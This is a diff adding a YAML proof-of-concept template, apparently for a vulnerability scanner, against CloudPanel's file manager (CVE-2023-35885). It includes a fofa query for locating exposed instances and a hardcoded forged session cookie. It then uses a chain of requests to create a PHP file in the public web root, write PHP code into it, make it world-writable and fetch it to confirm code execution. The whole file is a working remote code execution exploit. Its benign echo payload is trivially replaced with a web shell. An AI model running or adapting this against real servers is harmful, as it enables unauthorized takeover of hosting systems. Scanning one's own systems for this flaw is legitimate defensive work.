@@ -1,0 +1,47 @@
+id: poc-yaml-cloudpanel-remote-code-execution
+info:
+  name: Cloudpanel 远程代码执行漏洞(CVE-2023-35885)
+  severity: critical
+  tags:
+  - 两高一弱
+  - rce
+  - CVE-2023-35885
+  finger: cloudpanel
+  fofa: title="Cloudpanel"
+variables:
+  session: '"ZGVmNTAyMDA3ZDI0OGNjZmU0NTVkMGQ2NmJhMjUxYjdhYzg0NzcyYzBmNjM0ODg0ODY0OWYyZTQ0MjgwZDVjZDBjNmY3MWJiZWU4ZTM4OTU4ZmE4YjViNjE4MGJiZjQ4NzA3MzcwNTJiNzFhM2JjYTBmNTdiODQ4ZDZjYjhiNmY1N2U3YTM1YWY3YjA3MTM1ZTlkYjViMjY5OTkzM2Q3NTAyOWI0ZGQ5ZDZmOTFhYTVlZTRhZjg0ZTBmZTU5NjY4NGI4OGU0NjVkNDU4MWYxOTc2MGNiMGI0ZGY2MmZjM2RkMmI4N2RhMzJkYTU4NjNjMWFmMGZlOWIwZjcyZGRkNmFhYzk3ZGVlZmY="
+
+    '
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: GET
+  path: /file-manager/
+  headers:
+    Cookie: clp-fm={{.session}}
+  expression: status_code == 200
+- method: POST
+  path: /file-manager/backend/makefile
+  headers:
+    Cookie: clp-fm={{.session}}
+    Content-Type: application/x-www-form-urlencoded
+  data: id=/htdocs/app/files/public/&name={{.t1}}.php
+  expression: status_code == 200
+- method: POST
+  path: /file-manager/backend/text
+  headers:
+    Cookie: clp-fm={{.session}}
+    Content-Type: application/x-www-form-urlencoded
+  data: id=/htdocs/app/files/public/{{.t1}}.php&content=<?php echo "{{.t2}}"; ?>
+  expression: status_code == 200
+- method: POST
+  path: /file-manager/backend/permissions
+  headers:
+    Cookie: clp-fm={{.session}}
+    Content-Type: application/x-www-form-urlencoded
+  data: id=/htdocs/app/files/public/{{.t1}}.php&permissions=0777
+  expression: status_code == 200
+- method: GET
+  path: /{{.t1}}.php
+  expression: status_code == 200 && contains(body,t2)
+transport: http
